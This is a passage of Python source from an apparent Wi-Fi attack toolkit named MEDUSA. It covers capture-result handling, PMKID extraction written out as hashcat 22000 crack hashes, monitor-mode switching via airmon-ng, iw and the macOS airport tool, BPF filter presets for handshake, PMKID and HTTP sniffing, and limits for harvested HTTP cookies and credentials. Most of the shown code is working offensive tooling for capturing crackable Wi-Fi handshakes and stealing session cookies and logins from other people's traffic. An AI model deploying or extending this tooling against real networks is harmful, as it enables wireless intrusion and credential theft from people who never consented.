                  f"{result.handshake_count} handshakes, "
                  f"{result.pmkid_count} PMKIDs, "
                  f"{result.http_cookie_count} cookies, "
                  f"{result.http_cred_count} credentials", "ok")
        
        result.duration = time.time() - result.handshakes[0].timestamp if result.handshakes else 0
        return result
    
    def _analyze_pmkid(self, packet: 'Packet', detector: PMKIDDetector,
                        result: 'CaptureResult', hash_path: Path):
        """Extract PMKID from a management frame."""
        try:
            pmkid_info = detector.extract(packet)
            if pmkid_info:
                result.pmkid_captured = True
                result.pmkid_count += 1
                result.pmkids.append(pmkid_info)
                
                hl = HC22000Generator.generate_pmkid(pmkid_info)
                if hl:
                    with open(str(hash_path), 'a') as f:
                        f.write(hl + '\n')
                    result.hash_count += 1
                
                self._log(f"PMKID #{result.pmkid_count}: "
                          f"{pmkid_info.bssid[:12]} ({pmkid_info.ssid or 'hidden'})",
                          "success")
        except Exception:
            pass


# ====================================================================
# MONITOR MODE MANAGER (for platform)
# ====================================================================

class MonitorManager:
    """Manage monitor mode for different platforms."""
    
    @staticmethod
    def enable_monitor(interface: str) -> Tuple[bool, str]:
        """Enable monitor mode on interface.
        
        Returns:
            (success, monitor_interface_name)
        """
        if IS_LINUX:
            return MonitorManager._linux_enable_monitor(interface)
        elif IS_MACOS:
            return MonitorManager._macos_enable_monitor(interface)
        else:
            return False, "Monitor mode not supported on this platform"
    
    @staticmethod
    def disable_monitor(interface: str) -> bool:
        if IS_LINUX:
            return MonitorManager._linux_disable_monitor(interface)
        elif IS_MACOS:
            return MonitorManager._macos_disable_monitor(interface)
        return False
    
    @staticmethod
    def _linux_enable_monitor(interface: str) -> Tuple[bool, str]:
        try:
            # Check if already in monitor mode
            result = subprocess.run(
                ['iw', 'dev', interface, 'info'],
                capture_output=True, text=True, timeout=3
            )
            if 'type monitor' in result.stdout:
                return True, interface
            
            # Try airmon-ng first (if available)
            result = subprocess.run(
                ['airmon-ng', 'start', interface],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                # Parse interface name from output
                for line in result.stdout.split('\n'):
                    if 'monitor mode' in line and 'enabled' in line:
                        # Extract interface name
                        parts = line.strip().split()
                        for p in parts:
                            if 'mon' in p or interface in p:
                                mon_iface = p.strip(')(')
                                return True, mon_iface
            
            # Fallback: iw
            subprocess.run(
                ['iw', 'dev', interface, 'set', 'type', 'monitor'],
                capture_output=True, timeout=5
            )
            # Bring interface up
            subprocess.run(
                ['ip', 'link', 'set', interface, 'up'],
                capture_output=True, timeout=5
            )
            return True, interface
        
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def _linux_disable_monitor(interface: str) -> bool:
        try:
            subprocess.run(
                ['airmon-ng', 'stop', interface],
                capture_output=True, timeout=10
            )
            return True
        except Exception:
            try:
                subprocess.run(
                    ['iw', 'dev', interface, 'set', 'type', 'managed'],
                    capture_output=True, timeout=5
                )
                return True
            except Exception:
                return False
    
    @staticmethod
    def _macos_enable_monitor(interface: str) -> Tuple[bool, str]:
        try:
            # macOS: use airport
            result = subprocess.run(
                ['/System/Library/PrivateFrameworks/Apple80211.framework/'
                 'Versions/Current/Resources/airport',
                 interface, 'sniff', '1'],
                capture_output=True, timeout=3
            )
            # airport sniff creates a virtual interface
            return True, interface
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def _macos_disable_monitor(interface: str) -> bool:
        # airport stops automatically
        return True


# ====================================================================
# CONFIGURATION
# ====================================================================

# BPF filter presets
BPF_FILTERS = {
    'all': '',
    'handshake': 'ether proto 0x888e',
    'pmkid': 'type mgt subtype assoc-req or type mgt subtype assoc-resp or '
             'type mgt subtype probe-resp or type mgt subtype beacon',
    'http': 'tcp port 80 or tcp port 443',
    'wpa': 'ether proto 0x888e or type mgt subtype assoc-req or '
           'type mgt subtype assoc-resp or type mgt subtype probe-resp',
}

# Default ring buffer size for real-time packet log
DEFAULT_RING_BUFFER_SIZE = 5000

# Max HTTP cookies/credentials to store in memory
MAX_HTTP_COOKIES = 10000
MAX_HTTP_CREDENTIALS = 5000

# PCAP flush interval (packets)
PCAP_FLUSH_INTERVAL = 100

# Timeouts
HANDSHAKE_TIMEOUT = 10  # seconds between first and last handshake message

# PMKID length in bytes
PMKID_LEN = 16

# ====================================================================
# EXPORTED SYMBOLS
# ====================================================================

__all__ = [
    # Main classes
    'PacketCaptureEngine',
    'PCAPAnalyzer',
    'MonitorManager',
    
    # Handshake detection
    'EAPOLKeyInfo',
    'EAPOLFrameParser',
    'HandshakeStateMachine',
    'PMKIDDetector',
    
    # Hash generators
    'HC22000Generator',
    
    # HTTP extraction
    'HTTPExtractor',
    
    # Data classes
    'CaptureResult',
    'HandshakeInfo',
    'PMKIDInfo',
    'HTTPCookie',
    'HTTPCredential',
    
    # Constants
    'HAS_SCAPY',
    'SCAPY_VERSION',
    'BPF_FILTERS',
    
    # EAPOL types
    'EAPOL_TYPE_EAP_PACKET',
    'EAPOL_TYPE_KEY',
    'EAPOL_KEY_DESC_WPA',
    'EAPOL_KEY_DESC_WPA2',
    'EAPOL_KEY_INFO_INSTALL',
    'EAPOL_KEY_INFO_ACK',
    'EAPOL_KEY_INFO_MIC',
    'EAPOL_KEY_INFO_PAIRWISE',
    'EAPOL_KEY_INFO_SECURE_BIT',
    'EAPOL_KEY_INFO_ENCRYPTED_KEY_DATA',
]

# ====================================================================
# MAIN (Self-test)
# ====================================================================

if __name__ == '__main__':
    print(f"{'='*60}")
    print(f"  MEDUSA — Capture Engine v{VERSION} ({CODENAME})")
    print(f"  Scapy: {'✓' if HAS_SCAPY else '✗'} {SCAPY_VERSION or ''}")
    print(f"  Platform: {SYSTEM} ({ARCH})")
    if not HAS_SCAPY:
        print(f"  Install: pip install scapy")
    print(f"{'='*60}")
    
    if len(sys.argv) > 1:
        # Analyze mode
        analyzer = PCAPAnalyzer()
        result = analyzer.analyze(sys.argv[1])
        print(f"\nResults:")
        print(f"  Handshakes: {result.handshake_count}")
        print(f"  PMKIDs:     {result.pmkid_count}")
        print(f"  Cookies:    {result.http_cookie_count}")
        print(f"  Credentials: {result.http_cred_count}")
    else:
        # Test handshake detection with synthetic data
        print("\nTesting EAPOL frame parser...")
        
        from medusa_init import MedusaError
        from core import MedusaCore
        
        print("\nCapture engine initialized successfully.")
        print("Run with: python medusa_capture.py <pcap_file>")
